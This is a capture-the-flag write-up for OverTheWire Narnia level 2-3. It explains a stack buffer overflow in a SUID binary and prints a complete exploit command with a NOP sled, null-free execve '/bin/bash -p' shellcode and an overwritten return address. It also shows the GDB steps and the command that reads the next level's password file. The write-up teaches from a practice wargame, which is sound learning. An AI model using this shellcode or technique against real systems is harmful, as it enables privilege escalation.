# Narnia OverTheWire level 2-3

## Problem explanation and Relevant Background knowledge

-This level is a classic stack-based buffer overflow challenge.

-The binary is a 32-bit SUID executable that takes a command-line argument and copies it to a fixed-sixe buffer.

-The buffer holds 132 bytes.Since the binary runs with narnia3's privileges via SUID,succesfully exploiting it grants access as narnia3

-The key concepts needed to understand this challenge are how the x86 call stack works,specifically that when a function is called,the return address(EIP) is pushed onto the stack righ after the saved frame pointer.

-If we can write pass the end of the buffer we overwrite the saved EIP and control where thw program jumps when the function returns.

-The exploit strategy is to fill the buffer with a NOP sled followed by shellcode,then overwrite the EIP with an address pointing into the NOP sled.


## Solution process

-The total payload size needed is 136bytes: 132 bytes to fill the buffer plus 4 bytes to overwrite the return address


-First the buffer size was confirmed by testing input lenghts and observing srashes.GDB was used to inspect the stack after the crash and locate the NOP sled in memory.

-The challenge was that the shellcode needed to spawn /bin/bash -p to preserve SUID privileges, and it had to be completely free of null bytes since the shell truncates arguments at null bytes.the final working shellcode was 33bytes

Shellcode: https://github.com/7feilee/shellcode/blob/master/Linux%2Fx86%2Fexecve%28-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL%29.c


## Commands used


### Debug and find the stack addresses

    gdb ./narnia2
    r $(perl -e 'print "A"x136')
    x/200x $esp

### Run exploit
    
    ./narnia2 $(perl -e 'print "\x90"x99 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x80\xdc\xff\xff"')

### Read the password

    cat /etc/narnia_pass/narnia3


## Key concepts learned

### Stack-based buffer overflow

-Writing past a fixed buffer overwrites the saved return address,redirecting execution flow.

### NOP sled

-A sequence of \x90(no operation) instructions that slide execution into the shellcode, giving a larger target window for the return address 

### Shellcode null-bye avoidance

-Shells and string functions truncate at \x00, so shellcode must be carefully crafted to avoid null bytes entirely

### SUID and privilege preservation

-/bin/bash drops elevated privileges unless launched with -p making the choice of shellcode critical

### Perl for raw byte injection

-Python can corrupt raw bytes when passed as shell arguments while perl's print reliably outputs exact byte sequences.

